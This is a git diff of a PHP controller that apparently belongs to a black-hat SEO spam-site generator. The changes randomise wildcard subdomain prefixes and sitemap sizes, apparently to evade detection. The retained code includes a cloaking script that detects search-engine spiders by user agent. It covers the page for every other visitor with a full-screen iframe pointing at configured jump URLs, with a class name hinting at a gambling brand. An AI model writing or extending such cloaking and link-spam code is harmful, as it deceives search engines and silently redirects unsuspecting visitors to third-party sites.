@@ -15,12 +15,6 @@ class IndexController extends Controller
     public $template = null;
 
     /**
-     * 泛域名前缀
-     * @var string[]
-     */
-    public $prefix_array = [];
-
-    /**
      * 种类|类别
      * @var string[]
      */
@@ -36,7 +30,7 @@ class IndexController extends Controller
 
     public $prefix_path_status = 0;
 
-    public $prefix_title = '';
+    // public $prefix_title = '';
 
     public $cache_path = 'cache';
 
@@ -80,7 +74,6 @@ class IndexController extends Controller
         $this->model = $web_config[$this->host];
         $this->spider($request->userAgent(), $request->url(), $request->ip());
         $indexModel = new IndexModel();
-        $this->prefix_array = $indexModel->prefix_array;
         $this->nickname = $indexModel->nickname;
         // 模板
         $this->template = $this->model['template'] ?? die("<h2 style='text-align: center'> 网站未配置 template </h2>");
@@ -97,13 +90,6 @@ class IndexController extends Controller
             // 缓存存在直接输出
             if ($html) {
                 die($html);
-            }
-        }
-        // 标题
-        $prefix_title = mb_substr($_SERVER['HTTP_HOST'], 0, strpos($_SERVER['HTTP_HOST'], '.'));
-        if ($prefix_title) {
-            if (!empty($this->prefix_array[$prefix_title])) {
-                $this->prefix_title = $this->prefix_array[$prefix_title];
             }
         }
     }
@@ -127,7 +113,6 @@ class IndexController extends Controller
         }
 
         die($index_html);
-
     }
 
     /**
@@ -304,7 +289,7 @@ class IndexController extends Controller
             $prefix_str = '';
             // 泛前缀
             if ($this->prefix_status) {
-                $prefix_str = array_rand($this->prefix_array) . '.';
+                $prefix_str = $this->get_rand_str() . '.';
             }
             // 泛目录
             if ($this->prefix_path_status) {
@@ -326,7 +311,7 @@ class IndexController extends Controller
 
         // 有几个替换几个
         for ($i = 0; $i < $link_count; $i++) {
-            $prefix_str = array_rand($this->prefix_array) . '.';
+            $prefix_str = $this->get_rand_str() . '.';
             $html = preg_replace("/{随机泛域名}/", '//' . $prefix_str . $this->host, $html, 1);
         }
         return $html;
@@ -346,7 +331,7 @@ class IndexController extends Controller
             $prefix_str = '';
             // 泛前缀
             if ($this->prefix_status) {
-                $prefix_str = array_rand($this->prefix_array) . '.';
+                $prefix_str = $this->get_rand_str() . '.';
             }
             // 泛目录
             if ($this->prefix_path_status) {
@@ -513,12 +498,12 @@ class IndexController extends Controller
     public function sitemap(Request $request)
     {
         $XML = '';
-        for ($i = 0; $i < 1000; $i++) {
+        for ($i = 0; $i < rand(500,1000); $i++) {
             $prefix_str = 'http://www.';
             $prefix_path = '';
             // 泛前缀
             if ($this->prefix_status) {
-                $prefix_str = 'http://' . array_rand($this->prefix_array) . '.';
+                $prefix_str = 'http://' . $this->get_rand_str() . '.';
             }
             // 泛目录
             if ($this->prefix_path_status) {
@@ -566,8 +551,23 @@ class IndexController extends Controller
 <html><head><meta charset="utf-8"><title>Welcome！</title><script LANGUAGE="Javascript">var reg=/(Baiduspider|360Spider|YisouSpider|YandexBot|Sogou inst spider|Sogou spider|Sogou web spider|spider)/i;if(!reg.test(navigator.userAgent)){let flag=navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|QQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);if(flag){_src='$jump_url_m'}else{_src='$jump_url_pc'}document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');var hd=document.head;var styleCSS=document.createElement('style'),yabo=document.createElement('div');styleCSS.innerHTML='html,body{position:relative;width:auto !important;height:100% !important;min-width:auto !important;overflow:hidden;}.yabo{position:fixed;top:0;left:0;right:0;height:100%;z-index:9999999999;background:#fff;}';yabo.setAttribute('class','yabo');yabo.innerHTML='<iframe src='+_src+' frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>';hd.appendChild(styleCSS);hd.parentNode.appendChild(yabo)}</script>
 HTML;
             die($HTML);
-
         }
     }
 
+    /**
+     * 随机字符
+     */
+    public function get_rand_str(): string
+    {
+        //字符组合
+        $str = 'abcdefghijklmnopqrstuvwxyz';
+        $len = strlen($str) - 1;
+        $length = rand(3, 5);
+        $randstr = '';
+        for ($i = 0; $i < $length; $i++) {
+            $num = mt_rand(0, $len);
+            $randstr .= $str[$num];
+        }
+        return $randstr;
+    }
 }
